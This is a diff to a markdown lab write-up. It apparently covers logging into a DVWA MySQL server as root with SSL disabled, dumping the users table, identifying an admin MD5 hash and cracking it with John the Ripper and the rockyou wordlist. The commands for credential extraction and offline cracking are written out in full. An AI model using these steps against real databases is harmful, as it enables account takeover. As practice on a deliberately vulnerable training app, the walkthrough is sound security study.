@@ -21,7 +21,7 @@ I try to connect to the database using:
  ```
 but it shows error ><
 
-![alt text](image-1.png)
+![alt text](error_mysql.png)
 
 **WHY DOES THIS HAPPEN?**
 
@@ -36,16 +36,16 @@ mysql -h 192.168.100.131 -u root --ssl=off
 ```
 *by doing this we have disable SSL and bypasses the error but our credentials are not secured as it is not encrypted*
 
-![alt text](image-2.png)
+![alt text](conect-mysql.png)
 
 ### 2. USER ENUMERATION AND WEAK AUTHENTICATION
 
-next step is to gte the information about the database using:
+next step is to get the information about the database using:
 
 ```bash
 show databases;
 ```
-![alt text](image-3.png)
+![alt text](show-databse.png)
 
 *here we can see the dvwa which are vulnerable*
 
@@ -55,7 +55,7 @@ so we will be needing to look trough dvwa table using:
 use dvwa;
 ```
 
-![alt text](image-4.png)
+![alt text](use-dvwa.png)
 
 we will need to list the table so use:
 
@@ -63,7 +63,7 @@ we will need to list the table so use:
 show tables;
 ```
 
-![alt text](image-5.png)
+![alt text](show-table.png)
 
 *as we found user's database now we can use it*
 
@@ -73,7 +73,7 @@ try too look for passwords in users database using:
 select * from users;
 ```
 
-![alt text](image-7.png)
+![alt text](users-database.png)
 
 *From this output we can crack the password that we choose.In this case i choose admin's passwords which is:*
 
@@ -81,23 +81,52 @@ select * from users;
 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-Now lets try to figure out what kind of hash is that.
+
 
 ### 3. PASSWORD HASH DISCOVERY AND HASH IDENTIFICATION
 
-we will be using hash-identifier tool. To open it using kali type :
+we will be using hash-identifier tool to identify the hash. To open it using kali type :
 
 ```bash 
 hash-identifier
 ```
 
-![alt text](image-8.png)
+![alt text](hash-identifier.png)
 
 
 enter the hash and we will get the result !!
 
-![alt text](image-9.png)
-
-4.CRACK THE PASSWORD
+![alt text](result.png)
 
 
+
+4. CRACK THE PASSWORD
+
+
+create file hash.txt and paste the hash in it. Use :
+```
+echo "5f4dcc3b5aa765d61d8327deb882cf99">hash.txt  
+```
+
+
+![alt text](hash-txt.png)
+
+
+Then we will need to crack it using john the reaper. Use:
+
+
+```
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+```
+
+
+fnally now we can show the password using:
+
+```
+john --show --format=raw-md5 hash.txt 
+```
+
+
+
+![alt text](show-password.png)
